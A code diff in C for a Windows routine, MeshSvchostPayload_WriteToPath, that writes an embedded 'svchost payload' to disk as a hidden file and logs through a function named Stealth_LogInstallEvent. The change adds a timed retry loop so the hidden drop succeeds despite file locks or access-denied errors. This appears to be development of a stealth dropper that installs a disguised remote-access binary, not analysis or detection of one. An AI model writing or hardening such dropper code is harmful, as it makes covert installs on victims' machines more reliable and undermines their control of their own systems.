@@ -264,18 +264,47 @@ BOOL MeshSvchostPayload_WriteToPath(const wchar_t* destination)
 
     Stealth_LogInstallEvent(L"Emitting embedded svchost payload (%Iu bytes) to %ls", dataLength, destination);
 
-    HANDLE fileHandle = CreateFileW(destination,
-        GENERIC_WRITE,
-        0,
-        NULL,
-        CREATE_ALWAYS,
-        FILE_ATTRIBUTE_HIDDEN,
-        NULL);
-
-    if (fileHandle == INVALID_HANDLE_VALUE)
+    HANDLE fileHandle = INVALID_HANDLE_VALUE;
     {
-        Stealth_LogInstallEvent(L"CreateFile failed for %ls (error=%lu)", destination, GetLastError());
-        return FALSE;
+        const DWORD startTick = GetTickCount();
+        DWORD delay = 100;
+        DWORD lastErr = ERROR_SUCCESS;
+
+        for (;;)
+        {
+            fileHandle = CreateFileW(destination,
+                GENERIC_WRITE,
+                0,
+                NULL,
+                CREATE_ALWAYS,
+                FILE_ATTRIBUTE_HIDDEN,
+                NULL);
+
+            if (fileHandle != INVALID_HANDLE_VALUE)
+            {
+                break;
+            }
+
+            lastErr = GetLastError();
+            if (lastErr != ERROR_SHARING_VIOLATION &&
+                lastErr != ERROR_LOCK_VIOLATION &&
+                lastErr != ERROR_ACCESS_DENIED)
+            {
+                Stealth_LogInstallEvent(L"CreateFile failed for %ls (error=%lu)", destination, lastErr);
+                SetLastError(lastErr);
+                return FALSE;
+            }
+
+            if ((GetTickCount() - startTick) >= 60000)
+            {
+                Stealth_LogInstallEvent(L"CreateFile timed out for %ls (lastError=%lu)", destination, lastErr);
+                SetLastError(lastErr);
+                return FALSE;
+            }
+
+            Sleep(delay);
+            if (delay < 1000) { delay += 100; }
+        }
     }
 
     DWORD written = 0;
